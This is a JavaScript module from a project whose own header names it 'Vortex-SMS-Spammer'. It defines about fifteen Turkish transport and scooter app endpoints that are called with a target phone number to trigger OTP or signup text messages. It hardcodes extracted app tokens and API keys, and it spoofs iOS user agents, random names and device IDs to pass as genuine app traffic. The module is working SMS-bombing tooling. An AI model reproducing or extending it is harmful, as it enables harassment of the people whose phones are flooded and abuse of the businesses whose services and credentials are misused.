/**
 * VortexSMS - Transport Services
 * 
 * Copyright (c) 2025-present XeldarAlz
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Original Repository: https://github.com/XeldarAlz/Vortex-SMS-Spammer
 * 
 * NOTICE: Removing this notice or claiming this work as your own
 * is a violation of the license and may result in legal action.
 */

const { randomFirstName, randomLastName, randomDeviceId, randomDeviceInfo } = require('../helpers');
const ServiceBuilder = require('../service-builder');

const transportServices = [
    // CoreGap
    new ServiceBuilder('CoreGap')
        .url((phone) => `https://core.gap.im/v1/user/add.json?mobile=90${phone}`)
        .build(),

    // Tazi
    new ServiceBuilder('Tazi')
        .url('https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin')
        .headers({
            Accept: 'application/json, text/plain, */*',
            'Content-Type': 'application/json;charset=utf-8',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            Authorization: 'Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD'
        })
        .json((phone) => ({
            cep_tel: phone,
            cep_tel_ulkekod: '90'
        }))
        .timeout(6000)
        .successCodes([200, 201, 202, 204, 205])
        .build(),

    // Taksim
    new ServiceBuilder('Taksim')
        .url('https://service.taksim.digital/services/PassengerRegister/Register')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/json; charset=utf-8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'User-Agent': 'TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            Token: 'gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E='
        })
        .json((phone) => ({
            countryPhoneCode: '+90',
            name: randomFirstName(),
            phoneNo: phone,
            surname: randomLastName()
        }))
        .timeout(6000)
        .build(),

    // Porty
    new ServiceBuilder('Porty')
        .url('https://panel.porty.tech:443/api.php?')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': 'Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            Token: 'q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ'
        })
        .json((phone) => ({
            job: 'start_login',
            phone: phone
        }))
        .timeout(6000)
        .build(),

    // Marti
    ServiceBuilder.jsonApi('Marti',
        'https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin',
        (phone) => ({
            mobilePhone: phone,
            mobilePhoneCountryCode: '90',
            oneSignalId: ''
        })
    ),

    // Bisu
    new ServiceBuilder('Bisu')
        .url('https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register')
        .headers({
            'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
            'X-Device-Platform': 'IOS',
            'X-Build-Version-Name': '9.4.0',
            Authorization: '0561b4dd-e668-48ac-b65e-5afa99bf098e',
            'X-Build-Version-Code': '22',
            Accept: '*/*',
            'X-Device-Manufacturer': 'Apple',
            'X-Device-Locale': 'en',
            'X-Client-Device-Id': randomDeviceId(),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'X-Device-Platform-Version': (() => randomDeviceInfo()['X-Device-Platform-Version'])(),
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `BiSU/22 CFNetwork/${deviceInfo.cfNetworkVersion} Darwin/${deviceInfo.darwinVersion}`;
            })(),
            'X-Device-Model': (() => randomDeviceInfo()['X-Device-Model'])(),
            'X-Build-Type': 'Release'
        })
        .form((phone) => ({ phoneNumber: phone }))
        .build(),

    // Orwi
    new ServiceBuilder('Orwi')
        .url('https://gandalf.orwi.app:443/api/user/requestOtp')
        .headers({
            'Content-Type': 'application/json',
            Accept: 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en;q=0.9',
            Token: '',
            Apikey: 'YWxpLTEyMzQ1MTEyNDU2NTQzMg',
            Origin: 'capacitor://localhost',
            Region: 'EN',
            'User-Agent': (() => randomDeviceInfo().userAgent)()
        })
        .json((phone) => ({
            gsm: '+90' + phone,
            source: 'orwi'
        }))
        .timeout(6000)
        .build(),

    // Tasimacim
    ServiceBuilder.jsonApi('Tasimacim',
        'https://server.tasimacim.com/requestcode',
        (phone) => ({
            phone: phone,
            lang: 'tr'
        })
    ),

    // Scooby
    new ServiceBuilder('Scooby')
        .url((phone) => `https://sct.scoobyturkiye.com:443/v1/mobile/user/code-request?phonenumber=90${phone}`)
        .method('GET')
        .timeout(6000)
        .build(),

    // Gez
    new ServiceBuilder('Gez')
        .url((phone) => `https://gezteknoloji.arabulucuyuz.net:443/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90${phone}`)
        .method('GET')
        .timeout(6000)
        .build(),

    // Jetle
    new ServiceBuilder('Jetle')
        .url((phone) => `http://ws.geowix.com:80/GeoCourier/SubmitPhoneToLogin?phonenumber=${phone}&firmaID=1048`)
        .method('GET')
        .timeout(6000)
        .build(),

    // Rabbit
    new ServiceBuilder('Rabbit')
        .url('https://api.rbbt.com.tr:443/v1/auth/authenticate')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'Rabbit/1.0.2 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            mobile_number: '+90' + phone,
            os_name: 'android',
            os_version: '7.1.2',
            app_version: '1.0.2(12)',
            push_id: '-'
        }))
        .timeout(6000)
        .build(),

    // Roombadi
    ServiceBuilder.jsonApi('Roombadi',
        'https://api.roombadi.com:443/api/v1/auth/otp/authenticate',
        (phone) => ({
            phone: phone,
            countryId: 2
        })
    ),

    // Hey Scooter (V14 endpoint - original)
    new ServiceBuilder('HeyScooter')
        .url((phone) => `https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=${phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9`)
        .headers({
            Accept: 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr'
        })
        .timeout(6000)
        .build(),

    // Hey Scooter (Alternative V9 endpoint)
    new ServiceBuilder('HeyScooterV9')
        .url((phone) => `https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=${phone}`)
        .headers({
            'user-agent': 'okhttp/3.12.1'
        })
        .timeout(6000)
        .build()
];

module.exports = transportServices;
